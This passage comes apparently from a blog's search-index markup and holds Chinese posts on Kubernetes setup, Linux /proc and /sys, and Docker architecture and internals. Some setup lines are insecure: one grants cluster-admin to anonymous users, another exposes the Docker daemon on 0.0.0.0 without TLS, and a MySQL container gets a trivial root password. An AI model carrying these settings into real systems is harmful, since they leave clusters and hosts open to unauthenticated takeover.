&lt;p&gt;为匿名用户绑定管理员权限&lt;/p&gt;
&lt;p&gt;kubectl create clusterrolebinding test:anonymous --clusterrole=cluster-admin --user=system:anonymous&lt;/p&gt;
">【k8s】k8s环境搭建</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-proc/"" data-c="
          &lt;h2 id=&#34;proc&#34;&gt;/proc&lt;/h2&gt;
&lt;p&gt;Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。其实例如ps、top等很多命令正是从proc系统中读取信息。&lt;/p&gt;
&lt;p&gt;基于/proc文件系统如上所述的特殊性，其内的文件也常被称作虚拟文件，并具有一些独特的特点。例如，其中有些文件虽然使用查看命令查看时会返回大量信息，但文件本身的大小却会显示为0字节。此外，这些特殊文件中大多数文件的时间及日期属性通常为当前系统时间和日期，这跟它们随时会被刷新（存储于RAM中）有关。&lt;/p&gt;
&lt;p&gt;为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi目录中存储的就是当前系统上所有SCSI设备的相关信息，/proc/N/中存储的则是系统当前正在运行的进程的相关信息，其中N为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。&lt;/p&gt;
&lt;p&gt;大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如apm、free、lspci或top查看时却可以有着不错的表现。&lt;/p&gt;
&lt;h3 id=&#34;常见文件&#34;&gt;常见文件&lt;/h3&gt;
&lt;h4 id=&#34;以数字命名的子目录&#34;&gt;以数字命名的子目录&lt;/h4&gt;
&lt;p&gt;/proc目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号，里面包含对应进程相关的多个信息文件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 10
dr-xr-xr-x.  9 root    root                  0 Jul 17 03:21 1003
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1082
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1085
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1086
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 11
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 117
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 12
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每个子文件中又包含了该进程的相关信息：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ls /proc/2977/
attr    # 提供安全相关属性
autogroup
auxv
cgroup # 所属cgroup
clear_refs
cmdline # 命令行参数
comm
coredump_filter
cpuset
cwd -&amp;gt; / # 当前工作目录的软连接
environ # 环境变量值
exe -&amp;gt; /usr/sbin/sshd # 指向该进程的执行命令文件
fd # 一个包含所有文件描述符的目录
fdinfo
gid_map
io
limits
loginuid
map_files
maps # 内存映射信息
mem # 进程的内存被利用的情况
mountinfo
mounts
mountstats
net
ns
numa_maps
oom_adj
oom_score
oom_score_adj
pagemap
patch_state
personality
projid_map
root -&amp;gt; / # 链接到此进程的root目录
sched
schedstat
sessionid
setgroups
smaps
stack
stat # 进程状态
statm # 进程内存使用信息
status # 进程当前状态，以可读的方式显示
syscall
task
timers
uid_map
wchan
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;常用系统信息文件&#34;&gt;常用系统信息文件&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/proc/cpuinfo # CPU的信息(型号、家族、缓存大小)
/proc/meminfo # 物理内存、交换空间等信息
/proc/mounts # 已加载的文件系统列表
/proc/filesystems # 被支持的文件系统
/proc/modules # 已加载的模块
/proc/version # 内核版本
/proc/cmdline # 系统启动时输入的内核命令行参数
/proc/interrupts # 中断使用情况
/proc/kmsg # 内核日志信息
/proc/devices # 可用的设备，如字符设备和块设备
/proc/uptime # 系统正常运行时间
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sys&#34;&gt;/sys&lt;/h2&gt;
&lt;p&gt;它可以产生一个包含所有系统硬件层次视图，通过把连接在系统上的设备和总线组织称为一个分级的文件，它们可以由用户空间获取，向用户空间导出内核的数据结构以及它们的属性。sysfs的一个目的就是展示设备驱动模型中各组件的层次关系。&lt;/p&gt;
&lt;p&gt;未完&lt;/p&gt;
&lt;p&gt;因此，系统中整体信息可通过procfs来获取，设备模型相关信息可通过sysfs来获取。&lt;/p&gt;
">【linux】/proc和/sys文件系统</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/docker-zu-jian-jia-gou/"" data-c="
          &lt;h2 id=&#34;docker架构&#34;&gt;Docker架构&lt;/h2&gt;
&lt;p&gt;Docker采用C/S架构，通过socket/RESTful API进行通信。&lt;/p&gt;
&lt;h3 id=&#34;docker-daemon&#34;&gt;Docker daemon&lt;/h3&gt;
&lt;p&gt;Docker daemon作为服务端守护进程，接受处理客户端请求并管理Docker对象，例如images、containers、networks和volumes，同时守护进程还可以与其他守护进程通信以管理Docker服务。&lt;/p&gt;
&lt;p&gt;默认监听本地&lt;code&gt;unix:///var/run/docker.sock&lt;/code&gt;套接字，只允许本地root访问，通过-H来修改监听方式。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 监听本地TCP 1234端口
$ sudo docker -H 0.0.0.0:1234 -d &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;服务端默认启动配置文件在&lt;code&gt;/etc/default/docker&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;docker-client&#34;&gt;Docker client&lt;/h3&gt;
&lt;p&gt;Docker客户端为用户提供一系列可执行命令，与Docker daemon交互，客户端发送命令后，等待服务端返回，一旦收到返回后，立刻执行并退出。&lt;/p&gt;
&lt;p&gt;默认通过本地&lt;code&gt;unix:///var/run/docker.sock&lt;/code&gt;套接字向服务端发送命令，如果服务端没有监听默认套接字，需要在客户端显式指定：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker -H tcp://127.0.0.1:1234 version
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538102794.svg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;docker-registries&#34;&gt;Docker registries&lt;/h3&gt;
&lt;p&gt;Docker registries用于存储Docker images，Docker Hub是任何人都可以使用的公共registry，Docker默认的registry是Docker Hub。也可以注册私人registry。&lt;/p&gt;
&lt;p&gt;当使用&lt;code&gt;docker pull/run&lt;/code&gt;或&lt;code&gt;docker push&lt;/code&gt;命令时，所需的image将从配置的registry中下载或上传。&lt;/p&gt;
&lt;h3 id=&#34;docker-object&#34;&gt;Docker object&lt;/h3&gt;
&lt;p&gt;Docker中的images、containers、networks、volumes、plugins等都称为Docker object。&lt;/p&gt;
&lt;h4 id=&#34;images&#34;&gt;images&lt;/h4&gt;
&lt;p&gt;image是一个只读的的模板，它包含了创建Docker container的一些指令等说明。通常情况下，一个image是基于另一个image创建的，加上了一些特殊的定制环境。例如基础ubantu image和基于其创建的具有apache web服务的ubantu image。&lt;/p&gt;
&lt;p&gt;可通过Dockerfile的方式创建镜像，Dockerfile创建镜像可理解为一个分层模型，Dockerfile中每一条指令都会创建一个层，当改变Dockerfile重建镜像时，只讲对应的层重建即可，这也是image轻量化的一个原因。&lt;/p&gt;
&lt;h4 id=&#34;container&#34;&gt;container&lt;/h4&gt;
&lt;p&gt;容器是一个镜像的可运行实例，可通过客户端对其进行创建，启动，停止或删除等一系列操作。一个容器可以连接一个或多个网络、一个或多个存储设备，当然也可以基于其当前状态创建一个新的镜像。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run -i -t ubantu /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此命令可以创建并启动一个ubantu容器，它将执行以下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果本地没有ubantu镜像，docker将会从registry中下载一个ubantu镜像，和执行&lt;code&gt;docker pull ubantu&lt;/code&gt;命令一样；&lt;/li&gt;
&lt;li&gt;创建一个容器，和执行&lt;code&gt;docker container create&lt;/code&gt;命令一样；&lt;/li&gt;
&lt;li&gt;docker为容器申请一个可读写文件系统，作为最后一层，这可以让运行中的容器在其本地文件系统中创建或修改文件和目录。&lt;/li&gt;
&lt;li&gt;由于没有指定任何网络操作，docker会创建一个网络接口将容器连接到默认网络，包括为容器指定IP，默认情况下，容器可以通过宿主机网络连接到外部网络。&lt;/li&gt;
&lt;li&gt;docker启动容器并执行/bin/bash。&lt;code&gt;-i -t&lt;/code&gt;的意思是以交互的方式运行容器并连接到当前终端，可以通过当前终端输入。&lt;/li&gt;
&lt;li&gt;当输入&lt;code&gt;exit&lt;/code&gt;到&lt;code&gt;/bin/bash&lt;/code&gt;，容器将会停止但不会删除。可以再次启动或删除。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;docker核心概念&#34;&gt;Docker核心概念&lt;/h2&gt;
&lt;h3 id=&#34;namespace&#34;&gt;namespace&lt;/h3&gt;
&lt;p&gt;命名空间是linux实现容器虚拟化引入的特性。创建容器时，docker为其创建一组命名空间。每个容器都可以拥有自己单独的命名空间，运行在其中的应用都像是在独立的操作系统中运行一样，保证了容器之间彼此互不影响。&lt;/p&gt;
&lt;p&gt;在操作系统中，包括内核、文件系统、网络、PID、UID、IPC、内存、硬盘、CPU等资源都是应用进程直接共享的。要实现虚拟化，除了要实现对内存、CPU、网络IO、硬盘IO、存储空间等的限制外，还需要实现文件系统、网络、PID、UID、IPC等的相互隔离。前者容易实现，而后者需要宿主机系统的深入支持。&lt;/p&gt;
&lt;p&gt;而linux的命名空间功能可以支持实现上述的需求。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;进程命名空间&lt;br&gt;
linux通过命名空间管理进程号，对于同一进程(同一个task_struct)，在不同的命名空间中，看到的进程号不相同，每个进程命名空间有一套自己的进程号管理方法。进程命名空间是一个父子关系的结构，子空间中的进程对于父空间是可见的。新fork出的进程在父命名空间和子命名空间将分别有一个进程号来对应&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 例如查看Docker主进程的pid的进程号是10751
docker ps |grep docker
root      10751      1  0 Feb02 ?        00:00:30 /usr/bin/dockerd-current --add-runtime docker-runc=/usr/libexec/docker/docker-runc-current --default-runtime=docker-runc --exec-opt native.cgroupdriver=systemd --userland-proxy-path=/usr/libexec/docker/docker-proxy-current --init-path=/usr/libexec/docker/docker-init-current --seccomp-profile=/etc/docker/seccomp.json --selinux-enabled --log-driver=journald --signature-verification=false --storage-driver overlay2
# pid=1是init进程，其他所有进程最初都有它管理产生


# 新建一个mysql容器
docker run -itd -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql-latest mysql

docker ps |grep docker
root      10751      1  0 Feb02 ?        00:00:33 /usr/bin/dockerd-current --add-runtime docker-runc=/usr/libexec/docker/docker-runc-current --default-runtime=docker-runc --exec-opt native.cgroupdriver=systemd --userland-proxy-path=/usr/libexec/docker/docker-proxy-current --init-path=/usr/libexec/docker/docker-init-current --seccomp-profile=/etc/docker/seccomp.json --selinux-enabled --log-driver=journald --signature-verification=false --storage-driver overlay2
root      13159  10751  0 02:44 ?        00:00:00 /usr/libexec/docker/docker-proxy-current -proto tcp -host-ip 0.0.0.0 -host-port 3306 -container-ip 172.17.0.2 -container-port 3306
# 查看新建容器进程的父容器，正是Docker主进程10751
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;网络命名空间&lt;br&gt;
一个网络命名空间为进程提供了一个完全独立的网络协议栈的视图，包括网络设备接口、IPv4和IPv6协议栈、IP路由表、防火墙规则，sockets等。这样每个容器的网络就能隔离开来。Docker采用虚拟网络设备的方式，将不同命名空间的网络设备连接到一起，默认情况下，容器中虚拟网卡将本地主机上的docker0网桥连接在一起。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538184128.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPC命名空间&lt;br&gt;
容器中进程交互还是采用了linux常见的进程间交互方法，包括信号量、消息队列和共享内存等。PID命名空间和IPC命名空间可以组合起来一起使用，同一个IPC名字空间内的进程可以彼此可见，允许进行交互，不同空间的进程则无法交互。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;挂载命名空间&lt;br&gt;
类似chroot，将一个进程方到一个特定的目录执行。挂载命名空间允许不同命名空间的进程看到文件结构不同，这样每个命名空间中的进程所看到的文件目录彼此被隔离。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;UTS命名空间&lt;br&gt;
UTS(UNIX Time-sharing System)命名空间允许每个容器拥有独立的主机名和域名，从而可以虚拟出一个有独立主机名和网络空间的环境，就和网络上一台独立的主机一样。&lt;br&gt;
默认情况下，Docker容器的主机名就是返回的容器ID：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                               NAMES
fdd435874ee2        mysql               &amp;quot;docker-entrypoint...&amp;quot;   2 hours ago         Up 15 minutes       0.0.0.0:3306-&amp;gt;3306/tcp, 33060/tcp   mysql-latest
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;用户命名空间&lt;br&gt;
每个容器可以有不同的用户和组id，也就是说可以在容器内使用特定的内部用户执行程序，而非本地系统上存在的用户。&lt;br&gt;
每个容器内部都可以有root账号，跟宿主主机不在一个命名空间。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;控制组&#34;&gt;控制组&lt;/h3&gt;
&lt;p&gt;命名空间隔离运行环境，使得容器中的进程看起来还想再地理的环境中运行，但光有环境隔离还不够，因为这些进程还是可以不受限制使用系统资源。为了防止进程占用太多资源而影响其他进程，Docker使用Cgroup对容器中的进程做限制，就是限制进程组使用的资源上限，包括 CPU，内存，磁盘，网络带宽。&lt;/p&gt;
&lt;p&gt;控制组(CGroups)是Linux内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。只有能控制分配到容器的资源，Docker才能避免多个容器同时运行时的系统资源竞争。&lt;br&gt;
控制组的设计目标是为不同的应用情况提供统一接口，从控制单一进程到系统级虚拟化。&lt;br&gt;
具体来看，控制组提供一下功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;资源限制：组可以设置为不超过设定的内存限制。&lt;/li&gt;
&lt;li&gt;优先级：通过优先级让一些组优先得到更多的CPU等资源。&lt;/li&gt;
&lt;li&gt;资源审计：用来统计系统实际上把多少资源用到适合的目的上，可以使用cpuacct子系统记录某个进程组使用的CPU时间。&lt;/li&gt;
&lt;li&gt;隔离：为组隔离名字空间，这样一个组不会看到另一个组的进程、网络连接和文件系统。&lt;/li&gt;
&lt;li&gt;控制：挂起、恢复和重启动等操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;安装Docker后可以在/sys/fs/cgroup/memory/docker/目录下看到对Docker组应用的各种限制项：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ls /sys/fs/cgroup/memory/docker
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;联合文件系统&#34;&gt;联合文件系统&lt;/h3&gt;
&lt;p&gt;在容器内，应该看到完全独立的文件系统，而且不会受到宿主机以及其他容器的影响。这个独立的文件系统，就叫做容器镜像。它还有一个更专业的名字叫 rootfs.rootfs 中包含了一个操作系统所需要的文件，配置和目录，但并不包含系统内核。因为在 Linux 中，文件和内核是分开存放的，操作系统只有在开启启动时才会加载指定的内核。这也就意味着，所有的容器都会共享宿主机上操作系统的内核。&lt;br&gt;
在 PaaS 时代，由于云端和本地的环境不同，应用打包的过程，一直是比较痛苦的过程。但有了 rootfs ，这个问题就被很好的解决了。因为在镜像内，打包的不仅仅是应用，还有所需要的依赖，都被封装在一起。这就解决了无论是在哪，应用都可以很好的运行的原因。&lt;/p&gt;
&lt;p&gt;不光这样，rootfs 还解决了可重用性的问题，想象这个场景，你通过 rootfs 打包了一个包含 java 环境的 centos 镜像，别人需要在容器内跑一个 apache 的服务，那么他是否需要从头开始搭建 java 环境呢？docker 在解决这个问题时，引入了一个叫层的概念，每次针对 rootfs 的修改，都只保存增量的内容，而不是 fork 一个新镜像。&lt;/p&gt;
&lt;p&gt;即联合文件系统是一个轻量级的分层文件系统，它支持将文件系统中的修改信息作为一次提交，并层层叠加，同时可以将不同目录挂载到同一个虚拟文件系统下。联合文件系统是实现Docker镜像的技术基础。镜像可以通过分层来进行继承。例如，用户基于基础镜像来制作各种不同的应用镜像。这些镜像共享同一个基础镜像层，提高了存储效率。此外，当用户改变了一个Docker镜像，则一个新的层会创建。因此，用户不用替换整个原镜像或重新建立，只需要添加新层即可。用户分发镜像的时候，也只需要分发被改动的新层内容。&lt;/p&gt;
&lt;p&gt;层级的想法，同样来自于 Linux，一个叫 union file system （联合文件系统）。它最主要的功能就是将不同位置的目录联合挂载到同一个目录下。对应在 Docker 里面，不同的环境则使用了不同的联合文件系统。比如 centos7 下最新的版本使用的是 overlay2，而 Ubuntu 16.04 和 Docker CE 18.05 使用的是 AuFS.&lt;/p&gt;
&lt;p&gt;可以通过 docker info 来查询使用的存储驱动：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker info |grep &#39;Storage Driver&#39;
Storage Driver: overlay2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当Docker利用镜像启动一个容器时，将利用镜像分配文件系统并且挂载一个新的可读写的层给容器，容器会在这个文件系统中创建，并且这个可读写的层被添加到镜像中。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538202745.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;网络实现&#34;&gt;网络实现&lt;/h3&gt;
&lt;p&gt;Docker的网络实现其实就是利用了linux上的网络命名空间和虚拟网络设备。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基本原理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;直观上看，要实现网络通信，机器需要至少一个网络接口(物理或虚拟接口)与外界相同，并可以收发数据包；此外，如果不同子网之间要进行通信，需要额外的路由机制。&lt;/p&gt;
&lt;p&gt;Docker中的网络接口默认都是虚拟接口。虚拟接口的最大优势就是转发效率极高。这是因为linux通过在内核中进行数据复制来实现虚拟接口之间的数据转发，即发送接口的发送缓存中的数据包将被直接复制到接收接口缓存中，而无需通过外部物理网络设备进行交换。对于本地系统和容器内系统来看，虚拟接口跟一个正常的以太网卡相比并无区别，只是它速度快很多。&lt;/p&gt;
&lt;p&gt;Docker容器网络就很好地利用了linux虚拟网络技术。它让本地主机和容器内分别创建一个虚拟接口，并让它们彼此连通。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538214687.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;网络创建过程&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Docker创建一个容器的时候，会具体执行如下操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一对虚拟接口，分别放到本地主机和新容器的命名空间中。&lt;/li&gt;
&lt;li&gt;本地主机一端的虚拟接口连接到默认的docker0网桥或指定网桥上，并具有一个以veth开头的唯一名字，如veth1234。&lt;/li&gt;
&lt;li&gt;容器一端的虚拟接口将放到新创建容器中，并修改名字作为eth0。这个接口只在容器的命名空间可见&lt;/li&gt;
&lt;li&gt;从网桥可用地址段中获取一个空闲地址分配给容器eth0，并配置默认路由网关为docker0网卡的内部接口docker0的IP地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;完成这些之后，容器就可以使用它所能看到的eth0虚拟网卡来连接其他容器和访问外部网络。&lt;/p&gt;
&lt;p&gt;容器的实质是进程，但与直接在宿主执行的实例进程不同，容器进程属于自己的独立的命名空间。因此容器可以拥有自己的root文件系统、自己的网络配置、自己的进程空间、甚至自己的用户ID。&lt;/p&gt;
&lt;p&gt;这样看来，容器只是一种被限制了的特殊进程。&lt;/p&gt;
&lt;h2 id=&#34;docker-containerd-docker-shim-runc之间的关系&#34;&gt;Docker、containerd、docker-shim、runC之间的关系&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;docker：docker本身而言包括了docker client和dockerd，dockerd实属是对容器相关操作的api的最上层封装，直接面向操作用户；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;containerd：dockerd实际真实调用的还是containerd的api接口(rpc方式实现)，containerd是dockerd和runC之间的一个中间交流组件，理论上，不运行dockerd，也能够直接通过containerd来管理容器。&lt;/p&gt;
&lt;p&gt;向上为Docker daemon提供gRPC接口，使得Docker Daemon屏蔽下面的结构变化，确保原有接口向下兼容。向下通过containerd-shim结合runC，使得引擎可以独立升级。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;docker-shim：真实运行容器的载体，每启动一个容器都会起一个新的docker-shim的进程。它通过指定三个参数：容器ID、bundle目录(containerd对应某个容器生成目录，一般位于：/var/run/docker/libcontainerd/containerID，其中包括了容器配置和标准输入、标准输出、标准错误三个管道文件)，运行时二进制(默认是runC)，来调用runC的api创建一个容器。&lt;/p&gt;
&lt;p&gt;主要作用是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它允许容器运行时(即 runC)在启动容器之后退出，简单说就是不必为每个容器一直运行一个容器运行时(runC)&lt;/li&gt;
&lt;li&gt;即使在 containerd 和 dockerd 都挂掉的情况下，容器的标准 IO 和其它的文件描述符也都是可用的&lt;/li&gt;
&lt;li&gt;向 containerd 报告容器的退出状态&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526233346.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;有了它就可以在不中断容器运行的情况下升级或重启 dockerd，对于生产环境来说意义重大。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;runC：是 Docker 公司按照 OCI 标准规范编写的一个操作容器的命令行工具，其前身是 libcontainer 项目演化而来，runC 实际上就是 libcontainer 配上了一个轻型的客户端，是一个命令行工具端，根据 OCI（开放容器组织）的标准来创建和运行容器，实现了容器启停、资源隔离等功能。Docker默认提供了docker-runc实现，事实上，通过containerd的封装，可以在Docker Daemon启动的时候指定runc的实现。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用runC运行busybox&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mkdir /container
# cd /container/
# mkdir rootfs

准备容器镜像的文件系统,从 busybox 镜像中提取
# docker export $(docker create busybox) | tar -C rootfs -xvf -
# ls rootfs/
bin  dev  etc  home  proc  root  sys  tmp  usr  var

# 有了rootfs之后，我们还要按照 OCI 标准有一个配置文件 config.json 说明如何运行容器，
# 包括要运行的命令、权限、环境变量等等内容，runc 提供了一个命令可以自动帮我们生成
# docker-runc spec
# ls
config.json  rootfs
# docker-runc run simplebusybox    #启动容器
/ # ls
bin   dev   etc   home  proc  root  sys   tmp   usr   var
/ # hostname
runc
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526312331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当Docker daemon启动之后，&lt;strong&gt;dockerd和docker-containerd进程一直存在&lt;/strong&gt;。当启动容器之后，&lt;strong&gt;docker-containerd进程会创建docker-containerd-shim进程&lt;/strong&gt;。最后docker-containerd-shim子进程，已经是实际在容器中运行的进程。&lt;/p&gt;
&lt;h2 id=&#34;moby-docker-ce与docker-ee的区别&#34;&gt;moby、docker-ce与docker-ee的区别&lt;/h2&gt;
&lt;p&gt;最早的时候docker就是一个开源项目，主要由docker公司维护。&lt;/p&gt;
&lt;p&gt;2017年年初，docker公司将原先的docker项目改名为moby，并创建了docker-ce和docker-ee。&lt;/p&gt;
&lt;p&gt;这三者的关系是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;moby是继承了原先的docker的项目，是社区维护的的开源项目，谁都可以在moby的基础打造自己的容器产品&lt;/li&gt;
&lt;li&gt;docker-ce是docker公司维护的开源项目，是一个基于moby项目的免费的容器产品&lt;/li&gt;
&lt;li&gt;docker-ee是docker公司维护的闭源产品，是docker公司的商业产品。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;moby project由社区维护， docker-ce project是docker公司维护，docker-ee是闭源的。&lt;/p&gt;
&lt;p&gt;要使用免费的docker，从网页docker-ce上获取。&lt;/p&gt;
&lt;p&gt;要使用收费的docker，从网页docker-ee上获取。&lt;/p&gt;
">【容器】Docker架构、核心概念</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/docker-yuan-ma-jia-gou/"" data-c="
          &lt;p&gt;本文参考：https://www.infoq.cn/article/docker-source-code-analysis-part1/&lt;/p&gt;
&lt;h2 id=&#34;docker源码架构&#34;&gt;Docker源码架构&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526355102.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;概述&#34;&gt;概述&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Docker Client：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户是通过Docker Client与Docker Daemon建立通信，并发送请求给后者。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker Daemon：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Docker Daemon一方面可以接收用户的请求，另一方面通过Engine执行Docker内部的一系列工作，每一项工作都是以一个Job的形式存在。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Job：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Job的运行过程中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当需要容器镜像时，则从Docker Registry中下载镜像，并通过镜像管理驱动graphdriver将下载镜像以Graph的形式存储；&lt;/li&gt;
&lt;li&gt;当需要创建网络环境时，通过网络管理驱动networkdriver创建并配置Docker容器网络环境；&lt;/li&gt;
&lt;li&gt;当需要限制容器运行资源或执行用户指令等操作时，则通过execdriver来完成。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;libcontiainer：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;libcontainer时一项独立的容器管理包，nerworkdriver以及execdriver都是通过libcontainer来实现具体对容器进行的操作。&lt;/p&gt;
&lt;h3 id=&#34;docker-client&#34;&gt;Docker Client&lt;/h3&gt;
&lt;p&gt;Docker Client 是 Docker 架构中用户用来和 Docker Daemon 建立通信的客户端。用户使用的可执行文件为docker(位于/bin/下)，每发送一次请求需要执行一次。&lt;/p&gt;
&lt;p&gt;可以通过以下三种方式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tcp://host:port
unix://path_to_socket
fd://socketfd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;client与daemon建立传输请求的时候，client可以通过设置命令行flag参数的形式设置安全传输层协议TLS的有关参数，保证传输的安全性。&lt;/p&gt;
&lt;h3 id=&#34;docker-daemon&#34;&gt;Docker Daemon&lt;/h3&gt;
&lt;p&gt;Docker Daemon 是 Docker 架构中一个常驻在后台的系统进程，该守护进程在后台启动了一个 Server，Server 负责接受 Docker Client 发送的请求；接受请求后，Server 通过路由与分发调度，找到相应的 Handler 来执行请求。&lt;/p&gt;
&lt;p&gt;Docker Daemon 启动所使用的可执行文件也为 docker，与 Docker Client 启动所使用的可执行文件 docker 相同。在 docker 命令执行时，通过传入的参数来判别 Docker Daemon 与 Docker Client。&lt;/p&gt;
&lt;p&gt;Docker Daemon架构，大致可以分为三个部分：Docker Server、Engine、Job。&lt;/p&gt;
&lt;h4 id=&#34;docker-server&#34;&gt;Docker Server&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526376435.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
